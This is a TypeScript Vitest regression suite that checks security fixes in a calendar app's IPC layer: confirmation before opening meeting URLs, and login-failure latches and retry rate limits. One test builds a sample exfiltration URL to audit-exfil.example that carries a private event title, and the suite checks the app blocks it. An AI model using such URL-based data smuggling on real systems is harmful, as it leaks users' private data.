import { describe, expect, it, vi } from 'vitest';

import { type CreateMeetingInput, type Snapshot } from '../src/shared/types';

import { ipcHarness } from './ipcSecurityHarness';

const meeting = (location: string): CreateMeetingInput => ({
    title: 'Private event',
    start: new Date(Date.now() + 3_600_000).toISOString(),
    end: new Date(Date.now() + 5_400_000).toISOString(),
    requiredAttendees: [],
    optionalAttendees: [],
    location,
    body: '',
    recurrence: { kind: 'none' },
});
describe('security audit regressions through real main-process IPC', () => {
    it('cannot authorize an exfiltration URL through an unconfirmed personal appointment', async () => {
        const h = ipcHarness(true);
        await h.service.syncNow();
        const snapshot = await h.call<Snapshot>('getSnapshot');
        const url = `https://audit-exfil.example/?data=${encodeURIComponent(snapshot.events[0].title)}`;
        expect(await h.call('createMeeting', meeting(url))).toEqual({ status: 'cancelled' });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).not.toHaveBeenCalled();
    });
    it('still saves and opens a personal appointment after explicit native consent', async () => {
        const h = ipcHarness(true);
        h.confirm.mockResolvedValue({ response: 1 });
        await h.service.syncNow();
        const url = 'https://meeting.example/room';
        expect(await h.call('createMeeting', meeting(url))).toMatchObject({
            status: 'created',
            invited: 0,
        });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).toHaveBeenCalledWith(url);
    });
    it('also refuses an unconfirmed URL change to an existing personal appointment', async () => {
        const h = ipcHarness(true);
        await h.service.syncNow();
        h.confirm.mockResolvedValue({ response: 1 });
        const input = meeting('https://meeting.example/original');
        await h.call('createMeeting', input);
        const event = h.service.events.find((e) => e.title === input.title)!;
        h.confirm.mockResolvedValue({ response: 0 });
        h.confirm.mockClear();
        const url = 'https://audit-exfil.example/changed';
        expect(await h.call('editMeeting', { ...input, id: event.id, location: url })).toEqual({
            status: 'cancelled',
        });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).not.toHaveBeenCalled();
    });
    it('preserves the wrong-password latch through repeated cache resets', async () => {
        const h = ipcHarness(false);
        await h.service.syncNow();
        expect(h.requests()).toBe(1);
        for (let i = 0; i < 3; i++) {
            // eslint-disable-next-line no-await-in-loop -- Sequential requests exercise state transitions and retry limits in order.
            await h.call('clearCache');
            // eslint-disable-next-line no-await-in-loop -- Sequential requests exercise state transitions and retry limits in order.
            await h.service.syncNow();
        }
        expect(h.requests()).toBe(1);
        expect(h.service.sync.errorKind).toBe('auth');
    });
    it('cannot bypass a failed login through connection testing or saving a password', async () => {
        const h = ipcHarness(false);
        await h.service.syncNow();
        const update = { settings: h.service.settings, password: 'synthetic-wrong-password' };
        await expect(h.call('testConnection', update)).rejects.toThrow(/отмен|cancel/i);
        await expect(h.call('saveSettings', update)).rejects.toThrow(
            /отмен|cancel|подожд|wait|Слишком/i,
        );
        expect(h.requests()).toBe(1);
        expect(h.service.sync.errorKind).toBe('auth');
    });
    it('a failed connection test also blocks automatic attempts and cache recovery', async () => {
        const h = ipcHarness(false);
        expect(await h.call('testConnection', { settings: h.service.settings })).toMatchObject({
            ok: false,
        });
        await h.call('clearCache');
        await h.service.syncNow();
        expect(h.requests()).toBe(1);
    });
    it('allows one confirmed retry and rate-limits further recovery prompts', async () => {
        const h = ipcHarness(false);
        await h.service.syncNow();
        h.confirm.mockResolvedValue({ response: 1 });
        await h.call('testConnection', { settings: h.service.settings });
        expect(h.requests()).toBe(2);
        expect(h.confirm).toHaveBeenCalledOnce();
        await expect(h.call('testConnection', { settings: h.service.settings })).rejects.toThrow(
            /подожд|wait|Слишком/,
        );
        expect(h.requests()).toBe(2);
        expect(h.confirm).toHaveBeenCalledOnce();
    });
    it('does not ask for a new login when only the theme changes after a failure', async () => {
        const h = ipcHarness(false);
        await h.service.syncNow();
        await h.call('saveSettings', { settings: { ...h.service.settings, theme: 'dark' } });
        expect(h.confirm).not.toHaveBeenCalled();
        expect(h.requests()).toBe(1);
    });
    it('invalidates retry consent if cache recovery replaces the session while the dialog is open', async () => {
        const h = ipcHarness(false);
        await h.service.syncNow();
        let answer!: (value: { response: number }) => void;
        h.confirm.mockImplementation(
            () =>
                new Promise((resolve) => {
                    answer = resolve;
                }),
        );
        const pending = h.call('testConnection', { settings: h.service.settings });
        const checked = expect(pending).rejects.toThrow(/Аккаунт изменился/);
        await vi.waitFor(() => expect(h.confirm).toHaveBeenCalledOnce());
        await h.call('clearCache');
        answer({ response: 1 });
        await checked;
        expect(h.requests()).toBe(1);
    });
});
